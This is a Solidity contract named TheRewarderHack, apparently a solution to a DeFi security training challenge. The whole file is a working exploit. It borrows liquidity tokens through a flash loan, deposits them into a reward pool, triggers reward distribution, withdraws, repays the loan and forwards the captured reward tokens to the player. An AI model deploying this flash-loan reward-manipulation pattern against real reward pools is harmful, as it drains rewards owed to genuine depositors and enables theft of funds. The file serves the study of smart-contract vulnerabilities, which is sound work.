// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface FlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface RewardPool {
   function deposit(uint256 amount) external;

   function distributeRewards() external returns (uint256 rewards);

   function withdraw(uint256 amount) external;
}

interface Token {
    // transfer function interface
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address account, uint256 amount) external;
}

contract TheRewarderHack {

    address private player;
    FlashLoanPool private flashLoanPool;
    RewardPool private rewardPool;
    Token private liquidityToken;
    Token private rewardToken;

    constructor(address playerAddress, address flashLoanPoolAddress, 
        address rewardPoolAddress, address liquidityTokenAddress, address rewardTokenAddress) {
        player = playerAddress;
        flashLoanPool = FlashLoanPool(flashLoanPoolAddress);
        rewardPool = RewardPool(rewardPoolAddress);
        liquidityToken = Token(liquidityTokenAddress);
        rewardToken = Token(rewardTokenAddress);
    }

    function attack(uint256 amount) external {
        require(msg.sender == player);
        flashLoanPool.flashLoan(amount);
        // Transfer the rewards token in this contract back to the user
        uint256 balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(player, balance);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        // Transfer the liquidity token in this contract back to the FlashLoanerPool contract
        // uint256 balance = liquidityToken.balanceOf(address(this)); // amount should be equal to this value
        liquidityToken.transfer(address(flashLoanPool), amount);
    }

    // receive() external payable {}

}